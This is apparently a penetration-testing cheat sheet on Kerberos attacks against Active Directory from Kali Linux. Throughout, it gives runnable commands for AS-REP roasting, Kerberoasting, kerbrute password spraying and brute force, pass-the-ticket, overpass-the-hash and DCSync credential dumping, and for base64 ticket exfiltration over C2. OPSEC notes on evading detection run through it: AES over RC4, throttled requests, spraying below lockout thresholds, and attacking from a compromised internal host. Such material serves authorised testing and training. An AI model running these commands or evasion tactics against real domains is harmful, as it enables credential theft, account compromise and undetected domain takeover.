---
title: "Kerberos Attacks — From Kali"
weight: 2
tags: ["ad", "kerberos", "kali", "impacket", "rubeus"]
---

## Quick Reference

| Attack | Tool | Hashcat Mode | Requirement |
|---|---|---|---|
| AS-REP Roasting | GetNPUsers.py / kerbrute | -m 18200 | DONT_REQ_PREAUTH flag set |
| Kerberoasting | GetUserSPNs.py | -m 13100 (RC4) / -m 19700 (AES) | Valid domain user + SPN exists |
| Pass-the-Ticket | getTGT.py + impacket | N/A | Valid credentials or hash |
| Overpass-the-Hash | getTGT.py -aesKey | N/A | AES256 key for user |
| Kerbrute userenum | kerbrute | N/A | Network access to DC on port 88 |
| Ticket conversion | ticket_converter.py | N/A | Existing .kirbi or .ccache |

---

## AS-REP Roasting

AS-REP Roasting targets accounts that have Kerberos pre-authentication disabled (`DONT_REQ_PREAUTH` flag set in `userAccountControl`). The KDC returns an AS-REP containing a portion encrypted with the user's hash — no prior authentication required, making it requestable by anyone.

### Without Credentials (User List Required)

First, enumerate valid users with kerbrute, then spray AS-REP requests:

```bash
# Enumerate valid users first
kerbrute userenum --dc DC_IP -d TARGET_DOMAIN /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -o valid_users.txt

# Request AS-REP hashes for all users in list — no credentials needed
impacket-GetNPUsers TARGET_DOMAIN/ -dc-ip DC_IP -no-pass -usersfile valid_users.txt

# Output directly to file
impacket-GetNPUsers TARGET_DOMAIN/ -dc-ip DC_IP -no-pass -usersfile valid_users.txt -outputfile asrep_hashes.txt -format hashcat
```

### With Credentials (Enumerate and Roast)

If you already have valid credentials, GetNPUsers can automatically find all accounts with pre-auth disabled:

```bash
# Enumerate and request hashes with credentials
impacket-GetNPUsers TARGET_DOMAIN/USERNAME:PASSWORD -dc-ip DC_IP -request

# Save output to file in hashcat format
impacket-GetNPUsers TARGET_DOMAIN/USERNAME:PASSWORD -dc-ip DC_IP -request -outputfile asrep_hashes.txt -format hashcat

# Target a specific user
impacket-GetNPUsers TARGET_DOMAIN/USERNAME:PASSWORD -dc-ip DC_IP -request -usersfile targets.txt
```

### Cracking AS-REP Hashes

```bash
# hashcat — krb5asrep mode
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt

# With rules for better coverage
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# john the ripper
john --format=krb5asrep asrep_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# john — show cracked
john --format=krb5asrep asrep_hashes.txt --show
```

### Identify Vulnerable Accounts via LDAP

```bash
# Find accounts with DONT_REQ_PREAUTH (UAC flag 0x400000 = 4194304)
ldapsearch -H ldap://DC_IP -x -b "DC=TARGET_DOMAIN,DC=local" \
  -D "TARGET_DOMAIN\USERNAME" -w 'PASSWORD' \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
  sAMAccountName userAccountControl

# Anonymous LDAP bind (if allowed)
ldapsearch -H ldap://DC_IP -x -b "DC=TARGET_DOMAIN,DC=local" \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
  sAMAccountName
```

> **Note:** AS-REP Roasting generates Windows event **4768** (TGT request) with encryption type `0x17` (RC4) and pre-auth type `0`. Monitor for multiple 4768 events from a single non-DC source IP targeting different accounts.

---

## Kerberoasting

Kerberoasting requests Service Tickets (TGS) for accounts that have a Service Principal Name (SPN) registered. The ticket is encrypted with the service account's password hash and can be cracked offline.

### Without Credentials (Needs a Valid User via -no-preauth Trick)

```bash
# Kerberoast without supplying a password — requires a user with pre-auth disabled
# First obtain the AS-REP, then use it to request TGS tickets
impacket-GetUserSPNs TARGET_DOMAIN/USERNAME -dc-ip DC_IP -no-preauth USERNAME -usersfile spn_targets.txt
```

### With Credentials — List SPN Accounts

```bash
# List all SPN accounts (no ticket request yet)
impacket-GetUserSPNs TARGET_DOMAIN/USERNAME:PASSWORD -dc-ip DC_IP

# Request tickets for all SPN accounts and output to file
impacket-GetUserSPNs TARGET_DOMAIN/USERNAME:PASSWORD -dc-ip DC_IP -request -outputfile kerberoast_hashes.txt

# Request ticket for a specific user
impacket-GetUserSPNs TARGET_DOMAIN/USERNAME:PASSWORD -dc-ip DC_IP -request-user SPN_ACCOUNT

# Pass-the-hash variation
impacket-GetUserSPNs -hashes :NTLM_HASH TARGET_DOMAIN/USERNAME -dc-ip DC_IP -request
```

### Targeted Kerberoasting

```bash
# Use a file with specific target users
impacket-GetUserSPNs TARGET_DOMAIN/USERNAME:PASSWORD -dc-ip DC_IP -usersfile spn_targets.txt -request

# Target a single known SPN user
impacket-GetUserSPNs TARGET_DOMAIN/USERNAME:PASSWORD -dc-ip DC_IP -request-user SPN_ACCOUNT -outputfile target_hash.txt
```

### Cracking Kerberoast Hashes

```bash
# hashcat — RC4 (type 23) TGS hash (most common)
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt

# hashcat — AES128 TGS hash
hashcat -m 19600 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt

# hashcat — AES256 TGS hash
hashcat -m 19700 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt

# john — TGS format
john --format=krb5tgs kerberoast_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
john --format=krb5tgs kerberoast_hashes.txt --show
```

### RC4 vs AES256 — Requesting Downgraded Tickets

By default, modern AD environments issue AES256 tickets for service accounts that support it. RC4 tickets crack significantly faster. When the account supports both, you can request RC4 downgrade:

```bash
# Check msDS-SupportedEncryptionTypes for the account
ldapsearch -H ldap://DC_IP -x -b "DC=TARGET_DOMAIN,DC=local" \
  -D "TARGET_DOMAIN\USERNAME" -w 'PASSWORD' \
  "(&(objectClass=user)(servicePrincipalName=*))" \
  sAMAccountName servicePrincipalName msDS-SupportedEncryptionTypes

# Value 0x18 = 24 = AES only (cannot downgrade)
# Value 0x1C = 28 = AES + RC4
# Value 0x4  = 4  = RC4 only
```

> **Note:** If `msDS-SupportedEncryptionTypes` is set to `0x18` (AES only), the KDC will not issue an RC4 ticket. Attempting to force RC4 will fail. In this case, use `-m 19700` for AES256 cracking.

### Find SPN Accounts via LDAP

```bash
# Find all accounts with SPNs
ldapsearch -H ldap://DC_IP -x -b "DC=TARGET_DOMAIN,DC=local" \
  -D "TARGET_DOMAIN\USERNAME" -w 'PASSWORD' \
  "(&(objectClass=user)(servicePrincipalName=*))" \
  sAMAccountName servicePrincipalName

# Find computer accounts with SPNs (less useful for roasting but good for recon)
ldapsearch -H ldap://DC_IP -x -b "DC=TARGET_DOMAIN,DC=local" \
  -D "TARGET_DOMAIN\USERNAME" -w 'PASSWORD' \
  "(&(objectClass=computer)(servicePrincipalName=*))" \
  sAMAccountName servicePrincipalName dNSHostName
```

> **Note:** Kerberoasting generates event **4769** (Service Ticket request) at the DC. High-value accounts (admincount=1) with SPNs are rare in legitimate environments — target these first. Avoid requesting tickets for all SPNs at once; spread requests over time.

---

## Kerbrute

Kerbrute uses the Kerberos pre-authentication mechanism to enumerate valid users and spray passwords. It operates on port 88 (Kerberos) and is stealthier than LDAP enumeration.

### Installation

```bash
# Download the latest Linux AMD64 binary
wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64 -O kerbrute
chmod +x kerbrute
sudo mv kerbrute /usr/local/bin/kerbrute

# Or build from source
git clone https://github.com/ropnop/kerbrute.git
cd kerbrute
make all
sudo mv dist/kerbrute_linux_amd64 /usr/local/bin/kerbrute
```

### User Enumeration

```bash
# Basic user enumeration against a DC
kerbrute userenum --dc DC_IP -d TARGET_DOMAIN /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

# Output valid users to file
kerbrute userenum --dc DC_IP -d TARGET_DOMAIN userlist.txt -o valid_users.txt

# Increase threads for faster enumeration (default: 10)
kerbrute userenum --dc DC_IP -d TARGET_DOMAIN userlist.txt -o valid_users.txt -t 50

# Verbose output to see responses
kerbrute userenum --dc DC_IP -d TARGET_DOMAIN userlist.txt -v
```

### Password Spraying

```bash
# Spray a single password against all users
kerbrute passwordspray -d TARGET_DOMAIN --dc DC_IP valid_users.txt 'PASSWORD'

# Output results
kerbrute passwordspray -d TARGET_DOMAIN --dc DC_IP valid_users.txt 'PASSWORD' -o spray_results.txt

# Safe spray — check lockout policy first, spray with caution
kerbrute passwordspray -d TARGET_DOMAIN --dc DC_IP valid_users.txt 'Welcome1!' --safe
```

### Brute Force Single User

```bash
# Brute force a specific user with a password list
kerbrute bruteuser -d TARGET_DOMAIN --dc DC_IP passwords.txt USERNAME

# Output
kerbrute bruteuser -d TARGET_DOMAIN --dc DC_IP passwords.txt USERNAME -o bruteforce_results.txt
```

> **Note (OPSEC):** Kerbrute userenum sends KRB_AS_REQ without pre-auth. A `KDC_ERR_C_PRINCIPAL_UNKNOWN` error means user does not exist; `KDC_ERR_PREAUTH_REQUIRED` means user exists. This does NOT generate failed logon events (4625) but DOES generate **4768** for valid users. However, the DC logs are the only place these appear — on many environments, AS-REQ logging is not configured. Password spraying DOES generate **4771** (pre-auth failure) events. Always check the domain lockout threshold before spraying with `nxc smb DC_IP -u USERNAME -p PASSWORD --pass-pol`.

---

## Pass-the-Ticket from Linux

Pass-the-Ticket (PtT) involves injecting a valid Kerberos TGT or TGS into the current session, allowing authentication as the ticket's principal without knowing the password. On Linux, tickets are stored as ccache files.

### Obtain a TGT

```bash
# With plaintext credentials
impacket-getTGT TARGET_DOMAIN/USERNAME:PASSWORD

# With NTLM hash (overpass-the-hash)
impacket-getTGT TARGET_DOMAIN/USERNAME -hashes :NTLM_HASH

# With AES key (cleaner, no RC4 downgrade detection)
impacket-getTGT TARGET_DOMAIN/USERNAME -aesKey AES256_HASH

# Output: USERNAME.ccache in current directory
```

### Export and Use the Ticket

```bash
# Set the ccache file as the active Kerberos credential cache
export KRB5CCNAME=USERNAME.ccache

# Verify the ticket
klist

# Use psexec via Kerberos (requires hostname, not IP)
impacket-psexec -k -no-pass TARGET_DOMAIN/USERNAME@DC_HOSTNAME

# Use wmiexec via Kerberos (can use IP)
impacket-wmiexec -k -no-pass TARGET_DOMAIN/USERNAME@TARGET_IP

# Use smbexec via Kerberos
impacket-smbexec -k -no-pass TARGET_DOMAIN/USERNAME@DC_HOSTNAME

# Use atexec via Kerberos
impacket-atexec -k -no-pass TARGET_DOMAIN/USERNAME@DC_HOSTNAME "whoami"

# secretsdump via Kerberos (DCSync)
impacket-secretsdump -k -no-pass TARGET_DOMAIN/USERNAME@DC_HOSTNAME -just-dc

# smb client via Kerberos
impacket-smbclient -k -no-pass TARGET_DOMAIN/USERNAME@DC_HOSTNAME
```

> **Note:** When using `-k`, impacket tools resolve the target hostname to obtain the correct SPN. Using an IP address directly may fail for services that require name-based SPN matching. Ensure `/etc/hosts` has the correct DC hostname mapped or DNS is functional. Also ensure system clock is within 5 minutes of the DC (Kerberos clock skew requirement): `sudo ntpdate DC_IP`.

---

## Overpass-the-Hash / Pass-the-Key

Overpass-the-Hash (OPtH) converts an NTLM hash or AES key into a Kerberos TGT, effectively "upgrading" a hash to a full Kerberos ticket. This is preferable over Pass-the-Hash in environments with SMB signing enforced or NTLM restricted.

### With NTLM Hash

```bash
# Convert NTLM hash to TGT (requests RC4-encrypted TGT)
impacket-getTGT TARGET_DOMAIN/USERNAME -hashes :NTLM_HASH

# Use the resulting TGT
export KRB5CCNAME=USERNAME.ccache
impacket-psexec -k -no-pass TARGET_DOMAIN/USERNAME@DC_HOSTNAME
```

### With AES256 Key (Pass-the-Key)

Pass-the-Key uses the AES256 key directly — this generates AES-encrypted tickets which are less detectable than RC4 (NTLM-based TGTs generate event 4768 with etype 23 which is anomalous on modern networks):

```bash
# Request TGT using AES256 key
impacket-getTGT TARGET_DOMAIN/USERNAME -aesKey AES256_HASH

# Export and use
export KRB5CCNAME=USERNAME.ccache
klist

# Use with various impacket tools
impacket-psexec -k -no-pass TARGET_DOMAIN/USERNAME@DC_HOSTNAME
impacket-wmiexec -k -no-pass TARGET_DOMAIN/USERNAME@TARGET_IP
impacket-secretsdump -k -no-pass TARGET_DOMAIN/USERNAME@DC_HOSTNAME -just-dc
impacket-ldap3-cmdline -k -no-pass TARGET_DOMAIN/USERNAME@DC_HOSTNAME
```

### Extracting AES Keys

AES keys can be obtained via secretsdump with the `-just-dc` flag (outputs both NTLM and AES keys), or via mimikatz on Windows (`sekurlsa::ekeys`):

```bash
# Dump AES keys via secretsdump (requires DA)
impacket-secretsdump TARGET_DOMAIN/USERNAME:PASSWORD@DC_IP -just-dc

# Output includes lines like:
# USERNAME:aes256-cts-hmac-sha1-96:AES256_HASH
# USERNAME:aes128-cts-hmac-sha1-96:AES128_HASH
```

> **Note (OPSEC):** Using AES256 keys generates event 4768 with etype 18 (AES256-CTS) which is normal behavior and blends in. RC4-based TGT requests (etype 23) on modern Windows networks stand out and may trigger alerts. Always prefer AES keys when available.

---

## Ticket Conversion

Tickets exist in two formats: `.kirbi` (Windows, used by Mimikatz/Rubeus) and `.ccache` (Linux/MIT Kerberos, used by impacket). When exfiltrating tickets between platforms, conversion is necessary.

### Using ticket_converter.py

```bash
# kirbi to ccache (Windows ticket → Linux use)
impacket-ticketConverter ticket.kirbi ticket.ccache

# ccache to kirbi (Linux ticket → Windows use)
impacket-ticketConverter ticket.ccache ticket.kirbi

# Set and use ccache
export KRB5CCNAME=ticket.ccache
klist
impacket-psexec -k -no-pass TARGET_DOMAIN/USERNAME@DC_HOSTNAME
```

### Base64 Encode/Decode for Ticket Transfer

When exfiltrating tickets over text channels (e.g., C2 output, shell), encode to base64:

```bash
# Encode ccache to base64 for transfer
base64 -w 0 USERNAME.ccache > ticket_b64.txt

# Decode received base64 ticket
base64 -d ticket_b64.txt > USERNAME.ccache
export KRB5CCNAME=USERNAME.ccache
klist

# Encode kirbi to base64 (Rubeus output format — /nowrap)
base64 -w 0 ticket.kirbi

# Decode a Rubeus base64 kirbi blob and convert to ccache
echo 'BASE64_BLOB' | base64 -d > ticket.kirbi
impacket-ticketConverter ticket.kirbi ticket.ccache
export KRB5CCNAME=ticket.ccache
```

### Listing and Managing ccache Files

```bash
# List all tickets in current ccache
klist

# List all ccache files in /tmp (default location for Kerberos tickets)
ls -la /tmp/krb5cc_*

# Specify a ccache file directly
KRB5CCNAME=/tmp/krb5cc_USERNAME impacket-psexec -k -no-pass TARGET_DOMAIN/USERNAME@DC_HOSTNAME
```

> **Note:** Tickets obtained via Rubeus in base64 format (`/nowrap` flag) include the full TGT blob. When copying from Windows, strip any whitespace before base64 decoding. The `ticket_converter.py` script handles padding automatically.

---

## Kerberos Brute Force OPSEC

Kerberos-based attacks that involve multiple AS-REQ messages (userenum, password spray) carry specific detection and lockout risks.

### Account Lockout Risks

```bash
# Check domain password policy BEFORE spraying
nxc smb DC_IP -u USERNAME -p PASSWORD --pass-pol

# Output includes:
# Minimum password length, Password history count
# Lockout threshold (0 = no lockout)
# Lockout duration, Observation window

# Also check via ldapsearch
ldapsearch -H ldap://DC_IP -x -b "DC=TARGET_DOMAIN,DC=local" \
  -D "TARGET_DOMAIN\USERNAME" -w 'PASSWORD' \
  "(objectClass=domainDNS)" \
  lockoutThreshold lockoutDuration lockoutObservationWindow pwdHistoryLength minPwdLength
```

> **Note (OPSEC):** If `lockoutThreshold` is 0, there is no lockout — spray freely but slowly. If set to 3-5 attempts, leave a 1-attempt buffer. NEVER spray more attempts per user than `lockoutThreshold - 1`. Wait for the `lockoutObservationWindow` (typically 30 minutes) to reset the counter before a second spray round.

### Analysis Mode vs Attack Mode

```bash
# Kerbrute analysis mode — only validates users, no password attempts
kerbrute userenum --dc DC_IP -d TARGET_DOMAIN userlist.txt

# When to use analysis mode first:
# 1. Unknown lockout policy
# 2. High-value target where lockout is unacceptable
# 3. Validating user list before spraying
```

### KDC Event Logging

Understanding which Windows Security events are generated:

| Event ID | Description | Generated By |
|---|---|---|
| 4768 | Kerberos TGT request (AS-REQ) | AS-REP Roasting, getTGT.py, valid login |
| 4769 | Kerberos Service Ticket request (TGS-REQ) | Kerberoasting, normal service access |
| 4771 | Kerberos pre-authentication failed | Failed password spray, brute force |
| 4776 | NTLM authentication attempt | Pass-the-Hash, NTLM auth |
| 4624 | Successful logon | Post-exploitation lateral movement |

```bash
# Signs of AS-REP Roasting detection:
# - Multiple 4768 events from one source to different accounts
# - etype = 0x17 (RC4) on modern networks where AES is the default
# - PreAuthType = 0 (no pre-auth) for accounts that normally require it

# Signs of Kerberoasting detection:
# - Multiple 4769 events for service accounts from a single source
# - Encryption type = 0x17 (RC4) requested for accounts that support AES

# Signs of password spray detection:
# - Multiple 4771 events across different accounts in a short window
# - All failures from same source IP
```

> **Note (OPSEC):** If possible, perform Kerberos attacks from a compromised internal host rather than directly from your attack machine. This places the source IP within the internal network, making it harder to isolate as an external threat. Spacing requests across 10-30 second intervals significantly reduces the likelihood of threshold-based alerts triggering.

---

> **Disclaimer:** For educational purposes only. Unauthorized access to computer systems is illegal.
